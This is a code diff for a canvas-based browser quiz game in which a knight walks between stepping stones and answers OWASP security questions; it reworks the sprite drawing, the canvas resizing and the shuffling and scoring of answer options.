-    mc.ellipse(rx - 3, ry - 4, 14 + i % 3 * 5, 8, -0.3, 0, Math.PI * 2);
-    mc.fill();
-  }
-  // Mist in forest
-  mc.fillStyle = 'rgba(100,120,100,0.1)';
-  mc.fillRect(z1, MAP_H * 0.5, z2 - z1, MAP_H * 0.5);
+  ctx.globalAlpha=0.22;ctx.fillStyle='#000';ctx.beginPath();ctx.ellipse(0,7-bob*.3,18,5,0,0,Math.PI*2);ctx.fill();ctx.globalAlpha=1;
 
-  // ── ZONE 3: Torches & lava ──
-  for (var i = 0; i < 8; i++) {
-    var ttx = z2 + 100 + i * 170;
-    var tty = MAP_H * 0.54;
-    drawTorch(mc, ttx, tty);
-  }
-  // Lava cracks
-  mc.strokeStyle = 'rgba(255,80,0,0.4)';
-  mc.lineWidth = 3;
-  for (var i = 0; i < 6; i++) {
-    mc.beginPath();
-    var lx = z2 + 200 + i * 160;
-    mc.moveTo(lx, MAP_H * 0.57);
-    mc.lineTo(lx + 30, MAP_H * 0.62);
-    mc.lineTo(lx + 50, MAP_H * 0.58);
-    mc.lineTo(lx + 80, MAP_H * 0.65);
-    mc.stroke();
-    mc.fillStyle = 'rgba(255,80,0,0.2)';
-    mc.beginPath();
-    mc.ellipse(lx + 40, MAP_H * 0.62, 35, 8, 0.2, 0, Math.PI * 2);
-    mc.fill();
-  }
-  // Skull decorations
-  for (var i = 0; i < 5; i++) {
-    mc.font = '20px serif';
-    mc.fillText('💀', z2 + 300 + i * 180, MAP_H * 0.55);
-  }
-}
-
-function drawOakTree(mc, x, y) {
-  mc.fillStyle = '#5A3A1A';
-  mc.fillRect(x - 5, y, 10, 40);
-  mc.fillStyle = '#2E8B2E';
-  mc.beginPath();
-  mc.arc(x, y - 10, 35, 0, Math.PI * 2);
-  mc.fill();
-  mc.fillStyle = '#3AAA3A';
-  mc.beginPath();
-  mc.arc(x - 12, y - 20, 22, 0, Math.PI * 2);
-  mc.fill();
-  mc.fillStyle = '#4ABB4A';
-  mc.beginPath();
-  mc.arc(x + 8, y - 25, 18, 0, Math.PI * 2);
-  mc.fill();
-}
-
-function drawPineTree(mc, x, y) {
-  mc.fillStyle = '#3A2A14';
-  mc.fillRect(x - 4, y + 10, 8, 30);
-  mc.fillStyle = '#0A3A0A';
-  for (var i = 0; i < 3; i++) {
-    mc.beginPath();
-    mc.moveTo(x, y - 30 - i * 20);
-    mc.lineTo(x - 28 + i * 8, y + i * 20);
-    mc.lineTo(x + 28 - i * 8, y + i * 20);
-    mc.closePath();
-    mc.fill();
-    mc.fillStyle = '#0F5A0F';
-  }
-}
-
-function drawMushroom(mc, x, y) {
-  mc.fillStyle = '#6A3A1A';
-  mc.fillRect(x - 3, y - 6, 6, 10);
-  mc.fillStyle = '#C84A1A';
-  mc.beginPath();
-  mc.ellipse(x, y - 10, 12, 10, 0, Math.PI, 0);
-  mc.fill();
-  mc.fillStyle = 'rgba(255,255,255,0.7)';
-  mc.beginPath();
-  mc.arc(x - 4, y - 13, 2, 0, Math.PI * 2);
-  mc.fill();
-  mc.beginPath();
-  mc.arc(x + 4, y - 14, 1.5, 0, Math.PI * 2);
-  mc.fill();
-}
-
-function drawTorch(mc, x, y) {
-  mc.fillStyle = '#5A3A1A';
-  mc.fillRect(x - 3, y - 5, 6, 20);
-  mc.fillStyle = '#FF8C00';
-  mc.beginPath();
-  mc.arc(x, y - 10, 6, 0, Math.PI * 2);
-  mc.fill();
-  mc.fillStyle = 'rgba(255,140,0,0.3)';
-  mc.beginPath();
-  mc.arc(x, y - 8, 18, 0, Math.PI * 2);
-  mc.fill();
-  mc.fillStyle = '#FFD700';
-  mc.beginPath();
-  mc.arc(x, y - 12, 3, 0, Math.PI * 2);
-  mc.fill();
-}
-
-// ═══════════════════════════════════════════════════════
-// CHARACTER DRAWING
-// ═══════════════════════════════════════════════════════
-function drawKnight(ctx, cx, cy, frame, dir, action) {
-  ctx.save();
-  ctx.translate(cx, cy);
-  if (dir < 0) ctx.scale(-1, 1);
-
-  var f = frame % 4;
-  var bob = [0, -4, 0, -4][f];
-  var legSwing = [7, 0, -7, 0][f];
-  var armSwing = [-3, 0, 3, 0][f];
-
-  if (action === 'victory') {
-    bob = -12 + Math.sin(Date.now() / 120) * 6;
-    armSwing = Math.sin(Date.now() / 100) * 10;
-    legSwing = 0;
-  }
-  if (action === 'stumble') {
-    bob = Math.sin(Date.now() / 80) * 5;
-  }
-
-  // Shadow
-  ctx.globalAlpha = 0.25;
-  ctx.fillStyle = '#000';
-  ctx.beginPath();
-  ctx.ellipse(0, 8 - bob * 0.3, 20, 6, 0, 0, Math.PI * 2);
-  ctx.fill();
-  ctx.globalAlpha = 1;
-
-  // ── LEGS ──
-  ctx.fillStyle = '#1A3A70';
-  // Left leg
-  ctx.fillRect(-10, -10 + bob + legSwing * 0.8, 9, 18 - Math.abs(legSwing) * 0.3);
-  // Right leg
-  ctx.fillRect(1, -10 + bob - legSwing * 0.8, 9, 18 - Math.abs(legSwing) * 0.3);
-
-  // ── BOOTS ──
-  ctx.fillStyle = '#0D2040';
-  ctx.fillRect(-11, 7 + bob + legSwing * 0.8, 11, 6);
-  ctx.fillRect(0, 7 + bob - legSwing * 0.8, 11, 6);
-
-  // ── BODY ──
-  ctx.fillStyle = '#3A6FBF';
-  ctx.fillRect(-12, -34 + bob, 24, 26);
-
-  // ── CHEST PLATE ──
-  ctx.fillStyle = '#4A85D9';
-  ctx.fillRect(-10, -33 + bob, 20, 12);
-  ctx.fillStyle = '#2D5A99';
-  ctx.fillRect(-12, -22 + bob, 24, 4);
-
-  // ── BELT ──
-  ctx.fillStyle = '#C48A10';
-  ctx.fillRect(-12, -12 + bob, 24, 4);
-
-  // ── ARMS ──
-  ctx.fillStyle = '#3A6FBF';
-  ctx.fillRect(-19, -32 + bob + armSwing, 8, 18);
-  ctx.fillRect(11, -32 + bob - armSwing, 8, 18);
-
-  // ── SHIELD ──
-  ctx.fillStyle = '#2D5A99';
-  ctx.fillRect(-25, -36 + bob + armSwing, 11, 20);
-  ctx.strokeStyle = '#E8A820';
-  ctx.lineWidth = 1.5;
-  ctx.strokeRect(-25, -36 + bob + armSwing, 11, 20);
-  ctx.fillStyle = '#E8A820';
-  ctx.fillRect(-22, -30 + bob + armSwing, 3, 3);
-
-  // ── SWORD ──
-  if (action === 'victory') {
-    // Sword raised
-    ctx.fillStyle = '#C8C8C8';
-    ctx.fillRect(16, -52 + bob - armSwing, 4, 26);
-    ctx.fillStyle = '#8B4A00';
-    ctx.fillRect(14, -60 + bob - armSwing, 8, 10);
-    ctx.fillStyle = '#C48A10';
-    ctx.fillRect(12, -52 + bob - armSwing, 12, 3);
+  // Legs
+  ctx.fillStyle='#1A3A70';
+  ctx.fillRect(-10,-10+bob+ls*.8,9,18-Math.abs(ls)*.3);
+  ctx.fillRect(1,-10+bob-ls*.8,9,18-Math.abs(ls)*.3);
+  // Boots
+  ctx.fillStyle='#0D2040';
+  ctx.fillRect(-11,7+bob+ls*.8,11,6);ctx.fillRect(0,7+bob-ls*.8,11,6);
+  // Body
+  ctx.fillStyle='#3A6FBF';ctx.fillRect(-12,-34+bob,24,26);
+  ctx.fillStyle='#4A85D9';ctx.fillRect(-10,-33+bob,20,12);
+  ctx.fillStyle='#2D5A99';ctx.fillRect(-12,-22+bob,24,4);
+  // Belt
+  ctx.fillStyle='#C48A10';ctx.fillRect(-12,-12+bob,24,4);
+  // Arms
+  ctx.fillStyle='#3A6FBF';
+  ctx.fillRect(-19,-32+bob+as,8,18);ctx.fillRect(11,-32+bob-as,8,18);
+  // Shield
+  ctx.fillStyle='#2D5A99';ctx.fillRect(-25,-36+bob+as,11,20);
+  ctx.strokeStyle='#E8A820';ctx.lineWidth=1.5;ctx.strokeRect(-25,-36+bob+as,11,20);
+  ctx.fillStyle='#E8A820';ctx.fillRect(-22,-30+bob+as,3,3);
+  // Sword
+  if(action==='victory'){
+    ctx.fillStyle='#C8C8C8';ctx.fillRect(16,-52+bob-as,4,26);
+    ctx.fillStyle='#8B4A00';ctx.fillRect(14,-60+bob-as,8,10);
+    ctx.fillStyle='#C48A10';ctx.fillRect(12,-52+bob-as,12,3);
   } else {
-    ctx.fillStyle = '#C8C8C8';
-    ctx.fillRect(18, -34 + bob - armSwing, 4, 28);
-    ctx.fillStyle = '#8B4A00';
-    ctx.fillRect(16, -42 + bob - armSwing, 7, 10);
-    ctx.fillStyle = '#C48A10';
-    ctx.fillRect(14, -32 + bob - armSwing, 12, 3);
+    ctx.fillStyle='#C8C8C8';ctx.fillRect(18,-34+bob-as,4,28);
+    ctx.fillStyle='#8B4A00';ctx.fillRect(16,-42+bob-as,7,10);
+    ctx.fillStyle='#C48A10';ctx.fillRect(14,-32+bob-as,12,3);
   }
-
-  // ── NECK ──
-  ctx.fillStyle = '#F0C890';
-  ctx.fillRect(-5, -44 + bob, 10, 12);
-
-  // ── HELMET ──
-  ctx.fillStyle = '#2D5A99';
-  ctx.fillRect(-12, -58 + bob, 24, 16);
-
-  // Visor
-  ctx.fillStyle = '#1A3A70';
-  ctx.fillRect(-9, -48 + bob, 18, 6);
-
-  // Gold trim
-  ctx.fillStyle = '#C48A10';
-  ctx.fillRect(-12, -58 + bob, 24, 3);
-  ctx.fillRect(-12, -43 + bob, 24, 2);
-
+  // Neck
+  ctx.fillStyle='#F0C890';ctx.fillRect(-5,-44+bob,10,12);
+  // Helmet
+  ctx.fillStyle='#2D5A99';ctx.fillRect(-12,-58+bob,24,16);
+  ctx.fillStyle='#1A3A70';ctx.fillRect(-9,-48+bob,18,6);
+  ctx.fillStyle='#C48A10';ctx.fillRect(-12,-58+bob,24,3);ctx.fillRect(-12,-43+bob,24,2);
   // Plume
-  ctx.fillStyle = '#E84040';
-  ctx.fillRect(-3, -68 + bob, 6, 12);
-  ctx.fillRect(-6, -66 + bob, 12, 5);
-  ctx.fillStyle = '#FF6060';
-  ctx.fillRect(-2, -70 + bob, 4, 4);
+  ctx.fillStyle='#E84040';ctx.fillRect(-3,-68+bob,6,12);ctx.fillRect(-6,-66+bob,12,5);
+  ctx.fillStyle='#FF6060';ctx.fillRect(-2,-70+bob,4,4);
 
   ctx.restore();
 }
 
-// ═══════════════════════════════════════════════════════
-// CANVAS RESIZE & SETUP
-// ═══════════════════════════════════════════════════════
-function resizeCanvas() {
-  var panelW = wizShown ? 300 : 0;
-  vpW = window.innerWidth - panelW;
+// ═══════════════════════════════════════════════
+// CANVAS & RESIZE
+// ═══════════════════════════════════════════════
+function resizeCanvas(){
+  var lw = sidebarShown ? 230 : 0;
+  var rw = wizShown ? 280 : 0;
+  vpW = window.innerWidth - lw - rw;
   vpH = window.innerHeight - 56;
-  gc.width = vpW;
-  gc.height = vpH;
-  gc.style.left = '0';
+  gc.width = vpW; gc.height = vpH;
 }
 
-// ═══════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════
 // GAME LOOP
-// ═══════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════
 var lastTime = 0;
-function loop(ts) {
-  var dt = Math.min((ts - lastTime) / 1000, 0.05);
+function loop(ts){
+  var dt = Math.min((ts - lastTime)/1000, 0.05);
   lastTime = ts;
   tick++;
-
   update(dt);
   render();
   requestAnimationFrame(loop);
 }
 
-function update(dt) {
-  if (gameState === 'MODAL' || gameState === 'QUESTIONING') return;
-
-  // Character frame animation
+function update(dt){
+  if(gameState==='MODAL'||gameState==='QUESTIONING'||gameState==='INTRO') return;
   charFrameTimer += dt;
-  if (charMoving && charFrameTimer > 0.1) {
-    charFrame++;
-    charFrameTimer = 0;
-  }
-
-  // Move character toward target
-  if (charMoving) {
-    var dx = charTargetX - charX;
-    var dy = charTargetY - charY;
-    var dist = Math.sqrt(dx * dx + dy * dy);
-
+  if(charMoving && charFrameTimer > 0.1){charFrame++;charFrameTimer=0;}
+  if(charMoving){
+    var dx=charTargetX-charX, dy=charTargetY-charY;
+    var dist=Math.sqrt(dx*dx+dy*dy);
     charFacing = dx >= 0 ? 1 : -1;
-
-    if (dist < 3) {
-      charX = charTargetX;
-      charY = charTargetY;
-      charMoving = false;
-      charFrame = 0;
+    if(dist < 3){
+      charX=charTargetX; charY=charTargetY;
+      charMoving=false; charFrame=0;
       onReachedWaypoint();
     } else {
-      var speed = Math.min(180 * dt, dist);
-      charX += (dx / dist) * speed;
-      charY += (dy / dist) * speed;
+      var spd = Math.min(180*dt, dist);
+      charX += (dx/dist)*spd; charY += (dy/dist)*spd;
     }
   }
-
-  // Camera follows character
-  var desiredCamX = charX - vpW * 0.4;
-  desiredCamX = Math.max(0, Math.min(MAP_W - vpW, desiredCamX));
-  camX += (desiredCamX - camX) * Math.min(CAM_EASE * 60 * dt, 1);
+  var des = Math.max(0, Math.min(MAP_W-vpW/((window.innerHeight-56)/MAP_H), charX - vpW*0.4*(MAP_H/(window.innerHeight-56))));
+  camX += (des - camX) * Math.min(CAM_EASE*60*dt, 1);
 }
 
-function render() {
-  if (!ctx) return;
-  ctx.clearRect(0, 0, vpW, vpH);
-
-  // Scale map height to viewport
-  var scale = vpH / MAP_H;
+function render(){
+  if(!ctx) return;
+  ctx.clearRect(0,0,vpW,vpH);
+  var scale = vpH/MAP_H;
   ctx.save();
-  ctx.scale(scale, scale);
-  ctx.translate(-camX / scale, 0);
-
-  // Draw map
-  if (mapCanvas) ctx.drawImage(mapCanvas, 0, 0);
-
+  ctx.scale(scale,scale);
+  ctx.translate(-camX/scale,0);
+  if(mapCanvas) ctx.drawImage(mapCanvas,0,0);
   // Draw stones
-  for (var i = 1; i < WAYPOINTS.length - 1; i++) {
-    drawStone(ctx, WAYPOINTS[i], i);
-  }
-
-  // Draw start flag
+  for(var i=1;i<WAYPOINTS.length-1;i++) drawStone(ctx,WAYPOINTS[i],i);
   drawStartFlag(ctx);
-
-  // Draw end castle gate
   drawEndGate(ctx);
-
-  // Draw character
-  var cAction = charMoving ? 'walk' : charAction;
-  drawKnight(ctx, charX, charY, charFrame, charFacing, cAction);
-
-  // Dust particles when walking
-  if (charMoving && tick % 6 === 0) {
-    spawnDustOnCanvas(ctx, charX, charY);
-  }
-
+  drawKnight(ctx,charX,charY,charFrame,charFacing,charMoving?'walk':charAction);
   ctx.restore();
 }
 
-var dustParticles = [];
-function spawnDustOnCanvas(ctx, x, y) {
-  dustParticles.push({
-    x: x + (Math.random() - 0.5) * 20,
-    y: y + 5,
-    vx: (Math.random() - 0.5) * 30,
-    vy: -Math.random() * 20,
-    life: 1,
-    r: Math.random() * 5 + 3
-  });
-}
-
-function drawStone(ctx, wp, idx) {
-  var challenge = CHALLENGES[idx - 1];
-  if (!challenge) return;
-
-  var isDone = state.completed.includes(challenge.id);
-  var isCurrent = (stoneIdx === idx);
+function drawStone(ctx,wp,idx){
+  var ch = CHALLENGES[idx-1];
+  if(!ch) return;
+  var isDone = state.completed.includes(ch.id);
+  var isCur = stoneIdx===idx;
   var isLocked = !isDone && stoneIdx < idx;
+  var x=wp.x, y=wp.y, r=24;
 
-  var x = wp.x, y = wp.y;
+  if(isCur){ctx.shadowColor='#E8A820';ctx.shadowBlur=28+Math.sin(tick*.1)*8;}
+  ctx.beginPath();ctx.arc(x,y-r,r,0,Math.PI*2);
+  if(isDone){ctx.fillStyle='#1A4A2A';ctx.fill();ctx.strokeStyle='#2ECC8A';}
+  else if(isCur){ctx.fillStyle='#3A2A00';ctx.fill();ctx.strokeStyle='#E8A820';}
+  else if(isLocked){ctx.fillStyle='rgba(8,10,22,.7)';ctx.fill();ctx.strokeStyle='#1E2D50';}
+  else{ctx.fillStyle='#1A2040';ctx.fill();ctx.strokeStyle='#3A5080';}
+  ctx.lineWidth=3;ctx.stroke();ctx.shadowBlur=0;
 
-  // Glow for current stone
-  if (isCurrent) {
-    ctx.shadowColor = '#E8A820';
-    ctx.shadowBlur = 30 + Math.sin(tick * 0.1) * 10;
+  ctx.font='bold 13px Cinzel,serif';ctx.textAlign='center';ctx.textBaseline='middle';
+  if(isDone){ctx.fillStyle='#2ECC8A';ctx.fillText('✓',x,y-r);}
+  else if(isLocked){ctx.fillStyle='#2A3A5A';ctx.fillText('🔒',x,y-r);}
+  else{ctx.fillStyle=isCur?'#FFD700':'#7A9ACA';ctx.fillText(String(idx),x,y-r);}
+
+  if(!isLocked){
+    ctx.font='9px JetBrains Mono,monospace';
+    ctx.fillStyle=isDone?'rgba(46,204,138,.7)':isCur?'rgba(232,168,32,.8)':'rgba(100,130,180,.55)';
+    ctx.fillText((ch.topic||'').substring(0,14),x,y+6);
   }
-
-  // Stone base
-  var r = 24;
-  ctx.beginPath();
-  ctx.arc(x, y - r, r, 0, Math.PI * 2);
-
-  if (isDone) {
-    ctx.fillStyle = '#1A4A2A';
-    ctx.fill();
-    ctx.strokeStyle = '#2ECC8A';
-  } else if (isCurrent) {
-    ctx.fillStyle = '#3A2A00';
-    ctx.fill();
-    ctx.strokeStyle = '#E8A820';
-  } else if (isLocked) {
-    ctx.fillStyle = 'rgba(10,12,24,0.7)';
-    ctx.fill();
-    ctx.strokeStyle = '#1E2D50';
-  } else {
-    ctx.fillStyle = '#1A2040';
-    ctx.fill();
-    ctx.strokeStyle = '#3A5080';
-  }
-  ctx.lineWidth = 3;
-  ctx.stroke();
-  ctx.shadowBlur = 0;
-
-  // Stone number or checkmark
-  ctx.font = 'bold 13px Cinzel, serif';
-  ctx.textAlign = 'center';
-  ctx.textBaseline = 'middle';
-  if (isDone) {
-    ctx.fillStyle = '#2ECC8A';
-    ctx.fillText('✓', x, y - r);
-  } else if (isLocked) {
-    ctx.fillStyle = '#3A4A6A';
-    ctx.fillText('🔒', x, y - r);
-  } else {
-    ctx.fillStyle = isCurrent ? '#FFD700' : '#7A9ACA';
-    ctx.fillText(String(idx), x, y - r);
-  }
-
-  // Topic label below stone
-  if (!isLocked) {
-    ctx.font = '9px JetBrains Mono, monospace';
-    ctx.fillStyle = isDone ? 'rgba(46,204,138,0.7)' : isCurrent ? 'rgba(232,168,32,0.8)' : 'rgba(100,130,180,0.6)';
-    ctx.fillText(challenge.topic.substring(0, 14), x, y + 6);
-  }
-
-  // Stepping stone base (flat rock)
-  ctx.fillStyle = isDone ? '#2A5A3A' : isCurrent ? '#4A3A00' : '#151E35';
-  ctx.beginPath();
-  ctx.ellipse(x, y, 28, 10, 0, 0, Math.PI * 2);
-  ctx.fill();
+  ctx.fillStyle=isDone?'#2A5A3A':isCur?'#4A3A00':'#151E35';
+  ctx.beginPath();ctx.ellipse(x,y,28,10,0,0,Math.PI*2);ctx.fill();
 }
 
-function drawStartFlag(ctx) {
-  var wp = WAYPOINTS[0];
-  ctx.fillStyle = '#5A3A1A';
-  ctx.fillRect(wp.x - 2, wp.y - 60, 4, 50);
-  ctx.fillStyle = '#E8A820';
-  ctx.beginPath();
-  ctx.moveTo(wp.x + 2, wp.y - 60);
-  ctx.lineTo(wp.x + 2, wp.y - 40);
-  ctx.lineTo(wp.x + 24, wp.y - 50);
-  ctx.closePath();
-  ctx.fill();
-  ctx.font = '10px Cinzel, serif';
-  ctx.fillStyle = '#000';
-  ctx.textAlign = 'center';
-  ctx.fillText('START', wp.x + 12, wp.y - 49);
+function drawStartFlag(ctx){
+  var w=WAYPOINTS[0];
+  ctx.fillStyle='#5A3A1A';ctx.fillRect(w.x-2,w.y-60,4,50);
+  ctx.fillStyle='#E8A820';ctx.beginPath();ctx.moveTo(w.x+2,w.y-60);ctx.lineTo(w.x+2,w.y-40);ctx.lineTo(w.x+24,w.y-50);ctx.closePath();ctx.fill();
+  ctx.font='9px Cinzel,serif';ctx.fillStyle='#000';ctx.textAlign='center';ctx.fillText('START',w.x+12,w.y-49);
 }
 
-function drawEndGate(ctx) {
-  var wp = WAYPOINTS[WAYPOINTS.length - 1];
-  ctx.fillStyle = '#2A2040';
-  ctx.fillRect(wp.x - 30, wp.y - 80, 60, 70);
-  ctx.fillStyle = '#1A1030';
-  ctx.beginPath();
-  ctx.arc(wp.x, wp.y - 80, 30, Math.PI, 0);
-  ctx.fill();
-  ctx.strokeStyle = '#C48A10';
-  ctx.lineWidth = 3;
-  ctx.strokeRect(wp.x - 30, wp.y - 80, 60, 70);
-  // Portcullis
-  ctx.strokeStyle = '#8B6914';
-  ctx.lineWidth = 2;
-  for (var i = 0; i < 5; i++) {
-    ctx.beginPath();
-    ctx.moveTo(wp.x - 20 + i * 10, wp.y - 60);
-    ctx.lineTo(wp.x - 20 + i * 10, wp.y - 20);
-    ctx.stroke();
-  }
-  ctx.font = 'bold 10px Cinzel, serif';
-  ctx.fillStyle = '#E8A820';
-  ctx.textAlign = 'center';
-  ctx.fillText('CASTLE', wp.x, wp.y - 88);
+function drawEndGate(ctx){
+  var w=WAYPOINTS[WAYPOINTS.length-1];
+  ctx.fillStyle='#2A2040';ctx.fillRect(w.x-30,w.y-80,60,70);
+  ctx.fillStyle='#1A1030';ctx.beginPath();ctx.arc(w.x,w.y-80,30,Math.PI,0);ctx.fill();
+  ctx.strokeStyle='#C48A10';ctx.lineWidth=3;ctx.strokeRect(w.x-30,w.y-80,60,70);
+  ctx.strokeStyle='#8B6914';ctx.lineWidth=2;
+  for(var i=0;i<5;i++){ctx.beginPath();ctx.moveTo(w.x-20+i*10,w.y-60);ctx.lineTo(w.x-20+i*10,w.y-20);ctx.stroke();}
+  ctx.font='bold 10px Cinzel,serif';ctx.fillStyle='#E8A820';ctx.textAlign='center';ctx.fillText('CASTLE',w.x,w.y-88);
 }
 
-// ═══════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════
 // GAME STATE MACHINE
-// ═══════════════════════════════════════════════════════
-function onReachedWaypoint() {
-  if (stoneIdx === 0) {
-    // Arrived at first stone automatically
-    openQuestion();
+// ═══════════════════════════════════════════════
+function walkToNextStone(){
+  if(stoneIdx >= WAYPOINTS.length-1) return;
+  stoneIdx++;
+  charTargetX=WAYPOINTS[stoneIdx].x;
+  charTargetY=WAYPOINTS[stoneIdx].y;
+  charMoving=true; charAction='walk';
+  gameState='WALKING';
+  document.getElementById('qpanel').classList.remove('open');
+}
+
+function onReachedWaypoint(){
+  if(stoneIdx >= WAYPOINTS.length-1){
+    charAction='victory'; gameState='VICTORY';
+    setTimeout(showVictory, 1200);
     return;
   }
-  if (stoneIdx >= WAYPOINTS.length - 1) {
-    // Reached the castle!
-    charAction = 'victory';
-    gameState = 'VICTORY';
-    setTimeout(showCompletionModal, 1500);
-    return;
-  }
-  charAction = 'idle';
+  charAction='idle';
   openQuestion();
 }
 
-function walkToNextStone() {
-  if (stoneIdx >= WAYPOINTS.length - 1) return;
-  stoneIdx++;
-  charTargetX = WAYPOINTS[stoneIdx].x;
-  charTargetY = WAYPOINTS[stoneIdx].y;
-  charMoving = true;
-  charAction = 'walk';
-  gameState = 'WALKING';
-  document.getElementById('qpanel').classList.remove('open');
-}
-
-function openQuestion() {
-  var challenge = CHALLENGES[stoneIdx - 1];
-  if (!challenge) {
-    // No more challenges, go to end
-    stoneIdx++;
-    charTargetX = WAYPOINTS[stoneIdx] ? WAYPOINTS[stoneIdx].x : charX;
-    charTargetY = WAYPOINTS[stoneIdx] ? WAYPOINTS[stoneIdx].y : charY;
-    charMoving = true;
-    return;
-  }
-  current = challenge;
+function openQuestion(){
+  var ch = CHALLENGES[stoneIdx-1];
+  if(!ch){ walkToNextStone(); return; }
+  current = ch;
   answered = false;
-  charAction = 'idle';
-  gameState = 'QUESTIONING';
-  renderQuestion(challenge);
-  setTimeout(function() {
-    document.getElementById('qpanel').classList.add('open');
-  }, 300);
-  addWizMsg('wiz', '⚔️ Reached stone <strong>' + stoneIdx + '</strong>: <em>' + challenge.title + '</em> — ' + challenge.topic + '. Ask for hints!');
+
+  // Shuffle options
+  var opts = ch.options.map(function(o,i){return {text:o,idx:i};});
+  for(var i=opts.length-1;i>0;i--){
+    var j=Math.floor(Math.random()*(i+1));
+    var tmp=opts[i];opts[i]=opts[j];opts[j]=tmp;
+  }
+  shuffledOpts = opts;
+  shuffledCorrect = opts.findIndex(function(o){return o.idx===ch.correct;});
+
+  charAction='idle';
+  gameState='QUESTIONING';
+  renderQuestion(ch);
+  setTimeout(function(){document.getElementById('qpanel').classList.add('open');}, 250);
+
+  addWizMsg('wiz','⚔️ Stone <strong>'+stoneIdx+'</strong>: <em>'+ch.title+'</em> ('+ch.topic+'). Ask me for hints!');
+  renderSidebar();
 }
 
-function renderQuestion(ch) {
-  var rc = {
-    paige:{color:'#7BA7D4', label:'🛡️ Paige'},
-    squire:{color:'#C0976A', label:'⚔️ Squire'},
-    knight:{color:'#E8A820', label:'👑 Knight'}
-  };
-  var r = rc[ch.rank];
-  var tag = document.getElementById('qpTag');
-  tag.textContent = r.label + ' · ' + ch.topic;
-  tag.style.color = r.color;
-  tag.style.borderColor = r.color + '44';
-  document.getElementById('qpSub').textContent = 'OWASP Challenge #' + ch.id;
-  document.getElementById('qpXp').textContent = '+' + ch.xp + ' XP';
-  document.getElementById('qpTitle').textContent = ch.title;
-  document.getElementById('qpBody').textContent = ch.body;
+function renderQuestion(ch){
+  var rc={paige:{c:'#7BA7D4',l:'🛡️ Paige'},squire:{c:'#C0976A',l:'⚔️ Squire'},knight:{c:'#E8A820',l:'👑 Knight'}};
+  var r=rc[ch.rank||'paige'];
+  var tag=document.getElementById('qpTag');
+  tag.textContent=r.l+' · '+ch.topic;
+  tag.style.color=r.c; tag.style.borderColor=r.c+'44';
+  document.getElementById('qpSub').textContent='OWASP Challenge #'+stoneIdx;
+  document.getElementById('qpXp').textContent='+'+ch.xp+' XP';
+  document.getElementById('qpTitle').textContent=ch.title;
+  document.getElementById('qpBody').textContent=ch.body;
+  var codeEl=document.getElementById('qpCode');
+  if(ch.code){codeEl.style.display='block';codeEl.textContent=ch.code;}
+  else codeEl.style.display='none';
 
-  var codeEl = document.getElementById('qpCode');
-  if (ch.code) {
-    codeEl.style.display = 'block';
-    codeEl.textContent = ch.code;
-  } else {
-    codeEl.style.display = 'none';
-  }
-
-  var opts = document.getElementById('qpOpts');
-  var letters = ['A','B','C','D'];
-  opts.innerHTML = '';
-  ch.options.forEach(function(o, i) {
-    var btn = document.createElement('button');
-    btn.className = 'opt';
-    btn.id = 'opt' + i;
-    btn.onclick = function() { pickAnswer(i); };
-    btn.innerHTML = '<span class="oltr">' + letters[i] + '</span>' + escHtml(o);
+  var opts=document.getElementById('qpOpts');
+  opts.innerHTML='';
+  var letters=['A','B','C','D'];
+  shuffledOpts.forEach(function(o,i){
+    var btn=document.createElement('button');
+    btn.className='opt'; btn.id='opt'+i;
+    btn.onclick=function(){pickAnswer(i);};
+    btn.innerHTML='<span class="oltr">'+letters[i]+'</span>'+escHtml(o.text);
     opts.appendChild(btn);
   });
 
-  document.getElementById('qpExpl').className = 'expl';
-  document.getElementById('qpExpl').textContent = '';
-  document.getElementById('nxtBtn').className = 'nxt';
+  document.getElementById('qpExpl').className='expl';
+  document.getElementById('qpExpl').textContent='';
+  document.getElementById('nxtBtn').className='nxt';
 }
 
-function pickAnswer(idx) {
-  if (answered || !current) return;
-  answered = true;
-  var isCorrect = idx === current.correct;
+function pickAnswer(idx){
+  if(answered||!current) return;
+  answered=true;
+  var isCorrect = idx === shuffledCorrect;
 
-  current.options.forEach(function(_, i) {
-    var btn = document.getElementById('opt' + i);
-    if (!btn) return;
-    btn.disabled = true;
-    if (i === current.correct) btn.classList.add('correct');
-    else if (i === idx && !isCorrect) btn.classList.add('wrong');
+  shuffledOpts.forEach(function(_,i){
+    var btn=document.getElementById('opt'+i);
+    if(!btn) return;
+    btn.disabled=true;
+    if(i===shuffledCorrect) btn.classList.add('correct');
+    else if(i===idx&&!isCorrect) btn.classList.add('wrong');
   });
 
-  var expl = document.getElementById('qpExpl');
-  expl.textContent = current.explanation;
-  expl.className = 'expl show ' + (isCorrect ? 'ck' : 'wk');
-  document.getElementById('nxtBtn').className = 'nxt show';
+  var expl=document.getElementById('qpExpl');
+  expl.textContent=current.explanation;
+  expl.className='expl show '+(isCorrect?'ck':'wk');
+  document.getElementById('nxtBtn').className='nxt show';
 
-  if (isCorrect) {
-    var prevXP = state.xp;
-    state.xp += current.xp;
-    if (!state.completed.includes(current.id)) state.completed.push(current.id);
+  if(isCorrect){
+    var prevXP=state.xp;
+    state.xp+=current.xp;
+    if(!state.completed.includes(current.id)) state.completed.push(current.id);
     checkRankUp(prevXP);
-    saveState();
-    updateHUD();
-    charAction = 'victory';
-
+    saveState(); updateHUD(); renderSidebar();
+    charAction='victory';
     // XP popup
-    var pop = document.createElement('div');
-    pop.className = 'xppop';
-    pop.textContent = '+' + current.xp + ' XP!';
-    pop.style.left = (vpW * 0.35 + 'px');
-    pop.style.top = (vpH * 0.4 + 'px');
+    var pop=document.createElement('div');
+    pop.className='xppop';
+    pop.textContent='+'+current.xp+' XP!';
+    pop.style.left=(window.innerWidth*.4)+'px';
+    pop.style.top=(window.innerHeight*.45)+'px';
     document.body.appendChild(pop);
-    setTimeout(function() { pop.remove(); }, 1400);
-
-    // Particles
-    burst(vpW * 0.4, vpH * 0.5, '#2ECC8A');
-    addWizMsg('wiz', '🎉 <strong>Correct!</strong> +' + current.xp + ' XP! The realm grows safer!');
+    setTimeout(function(){pop.remove();},1600);
+    burst(window.innerWidth*.42, window.innerHeight*.5, '#2ECC8A');
+    addWizMsg('wiz','🎉 <strong>Correct!</strong> +'+current.xp+' XP! The realm grows safer!');
   } else {
-    charAction = 'stumble';
-    setTimeout(function() { charAction = 'idle'; }, 1000);
-    addWizMsg('wiz', '⚠️ Not quite. Correct: <strong>' + escHtml(current.options[current.correct]) + '</strong>');
+    charAction='stumble';
+    setTimeout(function(){charAction='idle';},1000);
